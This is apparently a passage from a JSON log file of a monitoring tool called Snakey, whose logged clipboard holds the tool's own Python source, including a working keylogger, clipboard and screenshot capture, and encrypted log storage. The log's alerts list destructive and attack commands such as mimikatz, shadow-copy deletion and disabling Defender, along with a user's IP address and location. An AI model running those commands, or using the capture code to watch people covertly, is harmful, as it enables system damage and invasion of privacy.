os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef check_disk_space(path: str, min_free_mb: int) -> bool:\r\n    \"\"\"Checks if there's enough free disk space at a given path.\"\"\"\r\n    try:\r\n        total, used, free = shutil.disk_usage(path)\r\n        free_mb = free / (1024 * 1024)\r\n        if free_mb < min_free_mb:\r\n            logger.warning(f\"Low disk space detected in {path}: {free_mb:.2f} MB free. Operations might be impacted.\", extra={\"path\": path, \"free_mb\": free_mb, \"min_free_mb\": min_free_mb})\r\n            return False\r\n        logger.debug(f\"Disk space OK in {path}: {free_mb:.2f} MB free.\")\r\n        return True\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check disk space for {path}: {e}\", exc_info=True, extra={\"path\": path})\r\n        return True # Assume OK if check fails, to avoid halting the daemon\r\n\r\ndef log_to_wazuh_file(data: dict):\r\n    \"\"\"Logs session data to a file in a Wazuh-compatible JSON format.\"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(data, default=str) + \"\\n\")\r\n        logger.info(\"Log written to Wazuh-compatible file.\", extra={\"log_file\": wazuh_log_file})\r\n    except Exception as e:\r\n        logger.error(f\"Wazuh log file write failed: {e}\", exc_info=True, extra={\"log_file\": wazuh_log_file})\r\n\r\ndef save_session_to_json(session_data: dict, filepath: str):\r\n    \"\"\"\r\n    Appends session data as a new JSON object to the specified file.\r\n    Each object is on a new line to make it easier to read/parse as NDJSON.\r\n    \"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in session_data and isinstance(session_data['timestamp'], datetime):\r\n            session_data['timestamp'] = session_data['timestamp'].isoformat()\r\n        \r\n        with open(filepath, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(session_data, default=str) + \"\\n\")\r\n        logger.info(f\"Session log appended to JSON file: {filepath}\", extra={\"log_file\": filepath})\r\n    except Exception as e:\r\n        logger.error(f\"Failed to write session log to JSON file {filepath}: {e}\", exc_info=True, extra={\"log_file\": filepath})\r\n\r\ndef send_to_elasticsearch(data: dict):\r\n    \"\"\"Sends collected session data to Elasticsearch.\"\"\"\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty for Kibana visualization (empty list is fine, None is bad)\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []\r\n            if not data_to_send.get('virustotal'):\r\n                data_to_send['virustotal'] = {}\r\n\r\n            logger.debug(f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\", extra={\"timestamp\": data_to_send['timestamp']})\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            logger.info(f\"Log sent to Elasticsearch. ID: {response['_id']}\", extra={\"es_id\": response['_id']})\r\n        except ConnectionError as e:\r\n            logger.error(f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        except AuthenticationException as e:\r\n            logger.error(f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        except TransportError as e:\r\n            logger.error(f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code, \"es_info\": e.info})\r\n        except Exception as e:\r\n            logger.error(f\"Unexpected failure sending log to Elasticsearch: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_send_error\"})\r\n    else:\r\n        logger.warning(\"Elasticsearch client is not configured or connected. Log will not be sent.\")\r\n\r\n\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Analyzes clipboard content for predefined sensitive command patterns.\"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            logger.info(f\"Sensitive CMD command detected in clipboard.\", extra={\"matched_command\": sensitive_cmd, \"clipboard_snippet\": clipboard_content[:100]})\r\n\r\n    return alerts_list\r\n\r\n\r\ndef check_country_change(current_country: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    last_country_path = os.path.join(base_path, \"last_country.txt\")\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\", encoding='utf-8') as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                logger.info(f\"Country changed: {last_country} -> {current_country}\", extra={\"old_country\": last_country, \"new_country\": current_country})\r\n        with open(last_country_path, \"w\", encoding='utf-8') as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check/update last country: {e}\", exc_info=True)\r\n    return alerts_list\r\n\r\n\r\ndef check_vpn_proxy_ip(current_ip: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Checks if the current public IP is in a list of known VPN/proxy IPs.\"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        logger.info(f\"Access from known VPN/proxy IP detected: {current_ip}\", extra={\"ip_address\": current_ip})\r\n    return alerts_list\r\n\r\n\r\n# === Keylogger Thread Function ===\r\ndef on_press_threaded(key):\r\n    \"\"\"Callback for pynput.keyboard.Listener on key press event.\"\"\"\r\n    global KEYLOGGER_KEYS\r\n    try:\r\n        if hasattr(key, 'char') and key.char is not None:\r\n            KEYLOGGER_KEYS.append(key.char)\r\n        elif key == Key.space:\r\n            KEYLOGGER_KEYS.append(' ')\r\n        elif key == Key.enter:\r\n            KEYLOGGER_KEYS.append('[ENTER]')\r\n        elif key == Key.backspace:\r\n            KEYLOGGER_KEYS.append('[BACKSPACE]')\r\n        elif key == Key.tab:\r\n            KEYLOGGER_KEYS.append('[TAB]')\r\n        else:\r\n            KEYLOGGER_KEYS.append(f\"[{str(key).replace('Key.', '')}]\")\r\n    except Exception as e:\r\n        logger.error(f\"Error in on_press_threaded keylogger: {e}\", exc_info=True)\r\n\r\ndef keylogger_thread_func():\r\n    \"\"\"Function to be run in a separate thread for continuous keylogging.\"\"\"\r\n    global KEYLOGGER_LISTENER\r\n    logger.info(\"Keylogger thread started.\")\r\n    try:\r\n        with Listener(on_press=on_press_threaded) as KEYLOGGER_LISTENER:\r\n            KEYLOGGER_LISTENER.join() # This will block until listener.stop() is called\r\n    except Exception as e:\r\n        logger.critical(f\"Keylogger thread encountered a critical error: {e}. Keylogger will terminate.\", exc_info=True)\r\n    finally:\r\n        logger.info(\"Keylogger thread terminated.\")\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session() -> dict:\r\n    \"\"\"Collects a full session's worth of system data, activities, and alerts.\"\"\"\r\n    current_time = datetime.now(timezone.utc)\r\n    session_log: dict = {\r\n        \"timestamp\": current_time.isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\", # Will be populated from global KEYLOGGER_KEYS\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n            logger.warning(f\"Could not get private IP: {e}\", extra={\"error\": str(e)})\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip: str | None = None\r\n        current_country: str | None = None\r\n        try:\r\n            ip_info_response = requests_get(\"https://ipinfo.io/json\", timeout=5)\r\n            ip_info_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)\r\n            ip_info = ip_info_response.json()\r\n\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if current_country and current_country not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {current_country}\")\r\n                logger.info(f\"Access from untrusted country: {current_country}\", extra={\"country\": current_country})\r\n\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            logger.warning(\"IP info lookup timed out.\", extra={\"error_type\": \"ipinfo_timeout\"})\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            logger.error(f\"IP info lookup failed: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_request_error\"})\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            logger.error(f\"Unexpected error during IP info lookup: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_unexpected_error\"})\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info collection error: {e}\")\r\n        logger.error(f\"System info collection error: {e}\", exc_info=True)\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(str(session_log[\"clipboard\"])) # Ensure clipboard is string before hashing\r\n\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            logger.error(f\"Clipboard error: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        logger.info(\"Clipboard collection skipped (not Windows).\")\r\n\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_file_path = os.path.join(base_path, screenshot_information)\r\n    if platform.system() == \"Windows\":\r\n        # Check disk space before attempting screenshot\r\n        if not check_disk_space(base_path, MIN_FREE_DISK_MB):\r\n            session_log[\"alerts\"].append(\"Screenshot skipped due to low disk space.\")\r\n            logger.warning(\"Screenshot skipped due to low disk space.\")\r\n        else:\r\n            try:\r\n                im = ImageGrab.grab()\r\n                im.save(screenshot_file_path)\r\n                session_log[\"screenshot_taken\"] = True\r\n                session_log[\"screenshot_hash\"] = hash_file(screenshot_file_path)\r\n\r\n                vt_result = vt_lookup_file(screenshot_file_path)\r\n                if vt_result:\r\n                    session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                    if vt_result.get(\"malicious\", 0) > 0:\r\n                        session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                        logger.info(f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n                else:\r\n                    logger.info(\"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n            except Exception as e:\r\n                session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n                logger.error(f\"Screenshot error: {e}\", exc_info=True)\r\n            finally:\r\n                if os.path.exists(screenshot_file_path):\r\n                    try:\r\n                        os.remove(screenshot_file_path)\r\n                        logger.debug(f\"Removed temporary screenshot file: {screenshot_file_path}\")\r\n                    except Exception as e:\r\n                        logger.error(f\"Failed to remove temporary screenshot file: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n        logger.info(\"Screenshot collection skipped (not Windows).\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith((\"http://\", \"https://\")):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                logger.info(f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n        else:\r\n            logger.info(\"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger: Collect accumulated keys from the dedicated keylogger thread\r\n    global KEYLOGGER_KEYS\r\n    session_log[\"keystrokes\"] = ''.join(KEYLOGGER_KEYS)\r\n    KEYLOGGER_KEYS = [] # Reset for the next collection cycle\r\n    logger.info(f\"Collected {len(session_log['keystrokes'])} keystrokes from keylogger thread.\")\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    if not check_disk_space(encrypted_path, MIN_FREE_DISK_MB):\r\n        session_log[\"alerts\"].append(\"Encryption and ledger update skipped due to low disk space.\")\r\n        logger.error(\"Encryption and ledger update skipped due to low disk space in encrypted_path.\")\r\n        return session_log # Exit without updating ledger for this log\r\n\r\n    try:\r\n        # 1. Prepare the full log for encryption\r\n        log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n        session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)\r\n\r\n        # 2. Encrypt the entire session log\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file (Atomic Write)\r\n        temp_enc_file_path = os.path.join(encrypted_path, f\".{encrypted_filename}.tmp\")\r\n        try:\r\n            with tempfile.NamedTemporaryFile(mode='wb', delete=False, dir=encrypted_path) as temp_f: # mode 'wb' for binary data\r\n                temp_f.write(encrypted_log_data)\r\n            shutil.move(temp_f.name, full_encrypted_filepath)\r\n            logger.info(f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n        except Exception as e:\r\n            logger.error(f\"Failed to save encrypted log atomically: {e}\", exc_info=True, extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(f\"Failed to save encrypted log: {e}\")\r\n            if os.path.exists(temp_enc_file_path):\r\n                os.remove(temp_enc_file_path)\r\n            return session_log # Critical failure, return\r\n\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            logger.error(\"Failed to hash encrypted log file. Ledger will not be updated with this log.\", extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(\"Failed to hash encrypted log file. Ledger not updated.\")\r\n            return session_log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger: list[dict] = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\", encoding='utf-8') as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed (list of hashes -> list of dicts)\r\n                    if ledger and isinstance(ledger[0], str):\r\n                        logger.info(\"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": datetime.now(timezone.utc).isoformat(), # Use current time for legacy entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        logger.info(\"Legacy hash ledger converted successfully.\")\r\n                except json.JSONDecodeError:\r\n                    logger.warning(\"Existing hash ledger file is corrupt. Starting with empty ledger.\", extra={\"file_path\": hash_ledger_path})\r\n                    ledger = []\r\n                except Exception as e:\r\n                    logger.error(f\"Error loading/converting hash ledger: {e}. Starting with empty ledger.\", exc_info=True, extra={\"file_path\": hash_ledger_path})\r\n                    ledger = [] # Start fresh on unexpected error\r\n\r\n            # Determine previous_encrypted_file_hash robustly\r\n            previous_encrypted_file_hash = \"0\" * 64\r\n            if ledger:\r\n                last_entry = ledger[-1]\r\n                if isinstance(last_entry, dict) and \"encrypted_file_hash\" in last_entry:\r\n                    previous_encrypted_file_hash = last_entry[\"encrypted_file_hash\"]\r\n                else:\r\n                    logger.warning(\"Last entry in hash ledger is malformed or missing 'encrypted_file_hash'. Using default previous hash ('0'*64).\", extra={\"last_ledger_entry\": str(last_entry)}) # Convert last_entry to str to avoid issues if it's complex/non-serializable\r\n            \r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            # Save the updated ledger (Atomic Write)\r\n            temp_ledger_path = os.path.join(base_path, \"hash_ledger_temp.json\")\r\n            try:\r\n                with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f:\r\n                    json.dump(ledger, temp_f, indent=4)\r\n                shutil.move(temp_f.name, hash_ledger_path)\r\n                logger.info(\"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n            except Exception as e:\r\n                logger.error(f\"Atomic write failed for hash ledger: {e}\", exc_info=True, extra={\"temp_path\": temp_ledger_path, \"target_path\": hash_ledger_path})\r\n                session_log[\"alerts\"].append(f\"Failed to update hash ledger atomically: {e}\")\r\n                if os.path.exists(temp_f.name):\r\n                    os.remove(temp_f.name)\r\n                # Fallback: try non-atomic write (less safe)\r\n                try:\r\n                    with open(hash_ledger_path, \"w\", encoding='utf-8') as f:\r\n                        json.dump(ledger, f, indent=4)\r\n                    logger.warning(\"Hash ledger updated with non-atomic write due to previous error.\", extra={\"target_path\": hash_ledger_path})\r\n                except Exception as fallback_e:\r\n                    logger.error(f\"Failed to write hash ledger even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": hash_ledger_path})\r\n                    session_log[\"alerts\"].append(f\"CRITICAL: Failed to write hash ledger even with fallback: {fallback_e}\")\r\n\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            if merkle_root:\r\n                # Save the Merkle root (Atomic Write)\r\n                temp_merkle_path = os.path.join(base_path, \"merkle_root_temp.txt\")\r\n                try:\r\n                    with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f_merkle:\r\n                        temp_f_merkle.write(merkle_root)\r\n                    shutil.move(temp_f_merkle.name, merkle_root_path)\r\n                    logger.info(\"Merkle root saved (based on encrypted file hashes).\")\r\n                except Exception as e:\r\n                    logger.error(f\"Atomic write failed for Merkle root: {e}\", exc_info=True, extra={\"temp_path\": temp_merkle_path, \"target_path\": merkle_root_path})\r\n                    session_log[\"alerts\"].append(f\"Failed to save Merkle root atomically: {e}\")\r\n                    if os.path.exists(temp_f_merkle.name):\r\n                        os.remove(temp_f_merkle.name)\r\n                    # Fallback\r\n                    try:\r\n                        with open(merkle_root_path, \"w\", encoding='utf-8') as f:\r\n                            f.write(merkle_root)\r\n                        logger.warning(\"Merkle root updated with non-atomic write due to previous error.\", extra={\"target_path\": merkle_root_path})\r\n                    except Exception as fallback_e:\r\n                        logger.error(f\"Failed to write Merkle root even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": merkle_root_path})\r\n                        session_log[\"alerts\"].append(f\"CRITICAL: Failed to write Merkle root even with fallback: {fallback_e}\")\r\n            else:\r\n                logger.warning(\"Merkle root could not be built (no hashes).\")\r\n\r\n\r\n        except Exception as e:\r\n            logger.error(f\"Failed to update hash ledger or Merkle root: {e}\", exc_info=True)\r\n            session_log[\"alerts\"].append(f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        logger.error(f\"Encryption or encrypted file save error: {e}\", exc_info=True)\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    logger.info(\"Starting Snakey in daemon mode...\")\r\n\r\n    # Start keylogger in a separate, persistent daemon thread\r\n    keylogger_thread = threading.Thread(target=keylogger_thread_func, daemon=True)\r\n    keylogger_thread.start()\r\n    logger.info(\"Keylogger thread initialized.\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        logger.info(\"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            logger.error(f\"Failed to remove existing stop file: {e}\", exc_info=True)\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            logger.info(\"Snakey terminated by stop_snakey.txt file.\")\r\n            # Gracefully stop keylogger thread\r\n            if KEYLOGGER_LISTENER:\r\n                logger.info(\"Stopping keylogger listener.\")\r\n                KEYLOGGER_LISTENER.stop()\r\n            break # Exit main loop\r\n\r\n        try:\r\n            session_log = collect_full_session() # Gathers all data, encrypts, updates ledger\r\n\r\n            # Send data to Elasticsearch (if connected)\r\n            send_to_elasticsearch(session_log)\r\n\r\n            # Save data to local JSON log file\r\n            save_session_to_json(session_log, json_log_path)\r\n\r\n            # Log to Wazuh-compatible file\r\n            log_to_wazuh_file(session_log)\r\n\r\n        except Exception as e:\r\n            logger.critical(f\"An unhandled error occurred in the main daemon loop: {e}\", exc_info=True)\r\n            # No `extra` here, as this is the top-level handler\r\n            session_log[\"alerts\"].append(f\"CRITICAL: Unhandled error in main loop: {e}\") # Add to log if possible\r\n\r\n        # Sleep for the configured interval\r\n        logger.info(f\"Sleeping for {config['time_sleep_seconds']} seconds before next collection at {datetime.now(timezone.utc).isoformat()}...\")\r\n        time.sleep(config['time_sleep_seconds'])\r\n\r\n    logger.info(\"Snakey daemon has stopped.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7bc953bbeac424b0f7d619989809cc46fb5a20586088b9b928a23e5c1b18d547", "screenshot_hash": "59326352088c39ec05b815b0d5a0fcf945e091c2a9d2e50500776a2054c6c043", "_raw_log_hash": "db9340aa77a235f186fba20756bfd6fbd49992d58f99bf9c0f4556f1a8e60da3"}
{"timestamp": "2025-06-11T17:09:17.670458+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport sys\r\nimport threading\r\nimport shutil\r\nimport traceback\r\nimport logging\r\nfrom logging.handlers import RotatingFileHandler, TimedRotatingFileHandler\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get as requests_get, post as requests_post # Renamed to avoid conflict with `get` from `requests`\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Still needed for general requests like ipinfo.io\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException, TransportError\r\nimport ssl # Not directly used for client, but good to have\r\nimport tempfile # For atomic writes\r\n\r\n\r\n# === Configuration Loading ===\r\n# Default configuration values\r\nDEFAULT_CONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    